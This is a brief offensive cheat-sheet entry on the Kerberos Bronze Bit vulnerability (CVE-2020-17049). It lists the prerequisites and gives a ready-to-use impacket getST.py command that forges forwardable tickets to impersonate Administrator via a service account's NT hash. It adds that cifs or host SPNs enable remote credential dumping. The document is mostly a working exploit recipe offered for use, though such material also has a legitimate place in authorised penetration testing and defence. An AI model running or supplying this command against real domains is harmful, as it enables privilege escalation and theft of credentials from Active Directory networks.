# Kerberos Bronze Bit CVE-2020-17049

### An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated.

## WARNING! Patched Error Message : [-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)

## Requirements

#### 1) Service account's password hash

#### 2) Service account's with Constrained Delegation or Resource Based Constrained Delegation

## Exploitation

 - getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -hashes :$Controlled_service_NThash $Domain/$Controlled_service_account

### The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, cifs/target.domain or host/target.domain will allow most remote dumping operations
